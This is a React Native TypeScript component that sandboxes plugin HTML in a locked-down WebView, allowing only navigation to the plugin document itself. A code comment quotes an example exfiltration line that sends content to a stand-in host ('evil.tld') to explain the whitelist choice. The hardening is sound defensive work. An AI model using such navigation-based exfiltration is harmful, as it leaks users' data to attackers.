import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { WebView, type WebViewMessageEvent } from "react-native-webview";
import { StyleSheet } from "react-native-unistyles";
import {
  createInitMessage,
  createUpdateMessage,
  handlePluginGuestMessage,
  wrapPluginHtml,
  type PluginHostMessage,
  type PluginSandboxProps,
} from "./bridge";
import { usePluginThemeTokens } from "./theme";
import { PLUGIN_READY_TIMEOUT_MS, PluginReadyTimeout } from "./sandbox-error";

/**
 * In a WebView the plugin is the top-level document, so `window.parent` is the
 * plugin itself and `window.parent.postMessage(...)` dispatches back onto its
 * own window. This forwarder picks those up and relays them to the host, which
 * keeps the plugin-facing contract identical to the iframe on web: post to
 * `window.parent`, listen on `window`.
 *
 * Host messages (`init`/`update`) are skipped so the relay cannot echo them.
 */
const GUEST_MESSAGE_FORWARDER = `
(function () {
  window.addEventListener("message", function (event) {
    var data = event.data;
    if (!data || data.paseo !== 1) return;
    if (data.type === "init" || data.type === "update") return;
    window.ReactNativeWebView.postMessage(JSON.stringify(data));
  });
})();
true;
`;

/**
 * Widening this to `*` is what narrows the hole, however wrong it reads.
 * react-native-webview checks the whitelist *before* it calls
 * `onShouldStartLoadWithRequest`: a non-whitelisted URL is handed to
 * `Linking.openURL`, which opens it in the user's real browser — so
 * `location.href = "https://evil.tld/?d=" + content` exfiltrates and our
 * callback never runs. With `*` every navigation reaches the callback below,
 * which is then the sole gate.
 */
const ORIGIN_WHITELIST = ["*"];

/** The plugin document itself. Anything else is a navigation we deny. */
function isPluginDocumentUrl(url: string): boolean {
  const normalized = url.trim().toLowerCase();
  return normalized === "about:blank" || normalized.startsWith("data:");
}

export function PluginSandbox({ html, context, onOpenFile, testID }: PluginSandboxProps) {
  const webViewRef = useRef<WebView | null>(null);
  const readyRef = useRef(false);
  const [handshake, setHandshake] = useState<"waiting" | "ready" | "timeout">("waiting");
  const [attempt, setAttempt] = useState(0);
  const themeTokens = usePluginThemeTokens();
  const latest = useRef({ context, onOpenFile, themeTokens });

  useEffect(() => {
    latest.current = { context, onOpenFile, themeTokens };
  }, [context, onOpenFile, themeTokens]);

  const source = useMemo(() => ({ html: wrapPluginHtml(html) }), [html]);

  useEffect(() => {
    readyRef.current = false;
    setHandshake("waiting");
  }, [source]);

  useEffect(() => {
    if (handshake !== "waiting") {
      return;
    }
    const timer = setTimeout(() => setHandshake("timeout"), PLUGIN_READY_TIMEOUT_MS);
    return () => clearTimeout(timer);
  }, [handshake, attempt]);

  const handleRetry = useCallback(() => {
    readyRef.current = false;
    setHandshake("waiting");
    setAttempt((current) => current + 1);
  }, []);

  const post = useCallback((message: PluginHostMessage) => {
    webViewRef.current?.injectJavaScript(
      `window.dispatchEvent(new MessageEvent("message", { data: ${JSON.stringify(message)} })); true;`,
    );
  }, []);

  const handleMessage = useCallback(
    (event: WebViewMessageEvent) => {
      handlePluginGuestMessage(event.nativeEvent.data, {
        onReady: () => {
          readyRef.current = true;
          setHandshake("ready");
          post(createInitMessage(latest.current.context, latest.current.themeTokens));
        },
        onOpenFile: (input) => latest.current.onOpenFile?.(input),
      });
    },
    [post],
  );

  useEffect(() => {
    if (!readyRef.current) {
      return;
    }
    post(createUpdateMessage(context, themeTokens));
  }, [context, themeTokens, post]);

  /**
   * Stateless on purpose: counting loads would grant the first callback
   * invocation whatever it is, and Android does not fire this for programmatic
   * or POST loads, so the plugin's first real navigation could be the one
   * allowed. Judge the URL instead.
   */
  const allowPluginDocumentOnly = useCallback(
    (request: { url: string }) => isPluginDocumentUrl(request.url),
    [],
  );

  if (handshake === "timeout") {
    return <PluginReadyTimeout onRetry={handleRetry} testID={testID} />;
  }

  return (
    <WebView
      key={attempt}
      ref={webViewRef}
      testID={testID}
      style={styles.webView}
      source={source}
      originWhitelist={ORIGIN_WHITELIST}
      onShouldStartLoadWithRequest={allowPluginDocumentOnly}
      injectedJavaScriptBeforeContentLoaded={GUEST_MESSAGE_FORWARDER}
      onMessage={handleMessage}
      javaScriptEnabled
      incognito
      domStorageEnabled={false}
      allowFileAccess={false}
      allowsLinkPreview={false}
      cacheEnabled={false}
      mediaPlaybackRequiresUserAction
      setSupportMultipleWindows={false}
      thirdPartyCookiesEnabled={false}
    />
  );
}

const styles = StyleSheet.create((theme) => ({
  webView: {
    flex: 1,
    minHeight: 0,
    backgroundColor: theme.colors.surface0,
  },
}));
